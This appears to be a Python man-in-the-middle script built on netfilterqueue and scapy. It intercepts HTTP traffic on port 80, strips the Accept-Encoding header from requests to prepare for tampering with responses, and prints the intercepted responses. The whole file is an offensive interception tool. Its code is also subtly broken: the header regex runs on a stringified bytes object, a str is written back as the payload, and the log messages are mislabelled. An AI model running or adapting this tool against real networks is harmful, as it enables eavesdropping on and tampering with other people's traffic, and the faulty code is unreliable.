#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re


def get_modified_packet(packet):
    print('[+] replacing file')
    packet[scapy.Raw].load = re.sub(
        'Accept-Encoding:.*?\\n\\n', '', str(packet[scapy.Raw].load))
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            new_packet = get_modified_packet(scapy_packet)
            packet.set_payload(bytes(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Request')
            print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
